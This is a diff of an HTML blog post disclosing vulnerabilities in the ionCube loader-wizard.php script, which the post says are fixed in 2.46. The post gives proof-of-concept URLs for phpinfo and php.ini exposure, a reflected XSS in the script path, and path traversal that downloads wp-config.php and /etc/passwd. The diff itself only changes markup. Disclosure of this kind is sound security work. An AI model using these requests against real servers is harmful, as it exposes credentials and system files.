@@ -137,23 +137,23 @@
 <p>The fixed version is 2.46. Some vulnerabilities like the phpinfo are not fixed because they represent the functionality of the script. Ioncube added a notice on top of every page to remove the file after successful installation.</p>
 <h1 id="phpinfo-exposure">phpinfo exposure</h1>
 <p>When calling the page <code>phpinfo</code> the scripts executes <code>phpinfo()</code> and presents the contents.</p>
-<pre><code>http://server.com/loader-wizard.php?page=phpinfo
+<pre tabindex="0"><code>http://server.com/loader-wizard.php?page=phpinfo
 </code></pre><p><img src="/img/ioncube/phpinfo.png" alt="phpinfo" title="phpinfo"></p>
 <h1 id="phpini-exposure">php.ini exposure</h1>
 <p>When calling the page <code>phpconfig</code> the scripts reads your <code>php.ini</code> settings file and prints out all the contents.</p>
-<pre><code>http://server.com/loader-wizard.php?page=phpconfig
+<pre tabindex="0"><code>http://server.com/loader-wizard.php?page=phpconfig
 </code></pre><p><img src="/img/ioncube/phpconfig.png" alt="phpconfig" title="phpconfig"></p>
 <h1 id="extra-information">extra information</h1>
 <p>When calling the page <code>extra</code> the scripts outputs some additional informations about the server.</p>
-<pre><code>http://server.com/loader-wizard.php?page=extra
+<pre tabindex="0"><code>http://server.com/loader-wizard.php?page=extra
 </code></pre><p><img src="/img/ioncube/extra.png" alt="extra" title="extra"></p>
 <h1 id="download-configs-as-zipped-file">Download configs as zipped file</h1>
 <p>When calling the page <code>system_info_archive</code> it&rsquo;s possible to download a zip file containing a copy of the <code>php.ini</code>, <code>phpinfo()</code> output and the extra informations printed on the <code>extra</code> page.</p>
-<pre><code>http://server.com/loader-wizard.php?page=system_info_archive
+<pre tabindex="0"><code>http://server.com/loader-wizard.php?page=system_info_archive
 </code></pre><p><img src="/img/ioncube/system_info_archive.png" alt="archive" title="archive"></p>
 <h1 id="reflected-xss">reflected XSS</h1>
 <p>The script uses the PHP variable <code>$self</code> in various places. It&rsquo;s possible to inject script code in the script name and thus the script is vulnerable to reflected cross site scripting.</p>
-<pre><code>http://server.com/loader-wizard.php/%3Cxss%3E
+<pre tabindex="0"><code>http://server.com/loader-wizard.php/%3Cxss%3E
 </code></pre><p>The string <code>&lt;xss&gt;</code> is printed out unescaped 10 times.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/loader-wizard.php/&lt;xss&gt;?page=css&#34;</span>&gt;
 setTimeout(&#34;window.location.href = &#39;/loader-wizard.php/&lt;<span style="color:#f92672">xss</span>&gt;?page=default&amp;amp;timeout=1&#39;&#34;,1000);
@@ -168,8 +168,8 @@ setTimeout(&#34;window.location.href = &#39;/loader-wizard.php/&lt;<span style="
 </code></pre></div><p><img src="/img/ioncube/xss.png" alt="xss" title="xss"></p>
 <h1 id="get-arbitrary-file-on-server">Get arbitrary file on server</h1>
 <p>The page <code>phpconfig</code> can be abused to download arbitrary files the webserver has access to.</p>
-<pre><code>http://server.com/loader-wizard.php?page=phpconfig&amp;ininame=../../../../../../../var/www/wordpress/wp-config.php&amp;download=1
-</code></pre><pre><code>http://server.com/loader-wizard.php?page=phpconfig&amp;ininame=../../../../../../../etc/passwd&amp;download=1
+<pre tabindex="0"><code>http://server.com/loader-wizard.php?page=phpconfig&amp;ininame=../../../../../../../var/www/wordpress/wp-config.php&amp;download=1
+</code></pre><pre tabindex="0"><code>http://server.com/loader-wizard.php?page=phpconfig&amp;ininame=../../../../../../../etc/passwd&amp;download=1
 </code></pre><p><img src="/img/ioncube/file.png" alt="file" title="file"></p>
 <h2 id="vulnerable-code">Vulnerable code</h2>
 <p>You can see you need to set the <code>download</code> parameter to supply an own <code>ininame</code>. On line 30 the filepath is constructed without sanitizing the filename.</p>
@@ -224,7 +224,7 @@ setTimeout(&#34;window.location.href = &#39;/loader-wizard.php/&lt;<span style="
     <div class="pure-menu pure-menu-horizontal pure-menu-open">
         <ul>
             <li>Copyright by Christian Mehlmauer</li>
-            <li>source code available on <a href="https://github.com/FireFart/blog">Github</a></li>
+            <li>source code available on <a href="https://github.com/FireFart/firefart.github.io">Github</a></li>
         </ul>
     </div>
 </div>
